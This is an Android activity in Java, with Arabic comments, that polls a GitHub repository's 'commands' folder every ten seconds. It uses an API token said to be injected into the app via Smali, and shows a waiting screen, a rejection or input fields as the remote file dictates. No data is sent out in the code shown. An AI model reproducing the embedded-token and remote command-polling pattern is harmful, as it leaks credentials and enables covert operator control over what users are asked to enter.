package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView; // استيراد مهم جداً

import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String GITHUB_TOKEN = ""; // يتم حقنه عبر Smali
    private final String GITHUB_REPO_PATH = "abdullah14120/ban";
    private final OkHttpClient client = new OkHttpClient();

    // تعريف العناصر (تعديل النوع هنا لمنع الـ Crash)
    private CardView layoutWaiting, layoutRejected, layoutFields; 
    private LinearLayout groupField1, groupField2, groupField3;
    private TextView txtRejectReason, txtUserDisplay;
    private EditText field1, field2, field3;
    private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder, btnCancelOrder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        userName = pref.getString("user_name", "");

        initViews();
        checkStatusFromGithub();
        // إنشاء مؤقت يفحص الحالة كل 10 ثوانٍ
new android.os.Handler().postDelayed(new Runnable() {
    @Override
    public void run() {
        checkStatusFromGithub(); // استدعاء دالة الفحص
        
        // إعادة تشغيل المؤقت مرة أخرى (Loop)
        new android.os.Handler().postDelayed(this, 10000); // 10000 مللي ثانية = 10 ثوانٍ
    }
}, 10000);

    }

    private void initViews() {
        // ربط الحاويات الجديدة (CardView)
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);

        // ربط باقي العناصر
        txtUserDisplay = findViewById(R.id.txtUserDisplay);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        field1 = findViewById(R.id.field1);
        field2 = findViewById(R.id.field2);
        field3 = findViewById(R.id.field3);
        btnConfirm1 = findViewById(R.id.btnConfirm1);
        btnConfirm2 = findViewById(R.id.btnConfirm2);
        btnConfirm3 = findViewById(R.id.btnConfirm3);
        btnFinalOrder = findViewById(R.id.btnFinalOrder);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
        groupField1 = findViewById(R.id.groupField1);
        groupField2 = findViewById(R.id.groupField2);
        groupField3 = findViewById(R.id.groupField3);

        txtUserDisplay.setText("مرحباً: " + userName);

        // زر الإلغاء
        btnCancelOrder.setOnClickListener(v -> {
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void checkStatusFromGithub() {
        String url = "https://api.github.com/repos/" + GITHUB_REPO_PATH + "/contents/commands/" + userName + ".json?timestamp=" + System.currentTimeMillis();
        
        Request request = new Request.Builder()
                .url(url)
                .header("Authorization", "token " + GITHUB_TOKEN)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        String jsonData = response.body().string();
                        JSONObject obj = new JSONObject(jsonData);
                        String contentBase64 = obj.getString("content").replace("\n", "");
                        String decoded = new String(Base64.decode(contentBase64, Base64.DEFAULT));
                        JSONObject statusObj = new JSONObject(decoded);
                        
                        String status = statusObj.optString("status", "waiting");
                        runOnUiThread(() -> updateUI(status, statusObj));
                    } catch (Exception e) { e.printStackTrace(); }
                }
            }
        });
    }

    private void updateUI(String status, JSONObject data) {
        // إخفاء الجميع أولاً
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);

        switch (status) {
            case "waiting":
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
            case "rejected":
                layoutRejected.setVisibility(View.VISIBLE);
                txtRejectReason.setText(data.optString("reason", "لا يوجد سبب محدد"));
                break;
            case "fields":
                layoutFields.setVisibility(View.VISIBLE);
                setupFields(data);
                break;
        }
    }

    private void setupFields(JSONObject data) {
        // منطق إظهار الحقول بناءً على محتوى ملف JSON
        groupField1.setVisibility(data.has("f1") ? View.VISIBLE : View.GONE);
        groupField2.setVisibility(data.has("f2") ? View.VISIBLE : View.GONE);
        groupField3.setVisibility(data.has("f3") ? View.VISIBLE : View.GONE);
        
        // إذا كانت الحقول المطلوبة قد تم ملؤها مسبقاً
        btnFinalOrder.setVisibility(View.VISIBLE);
    }
}
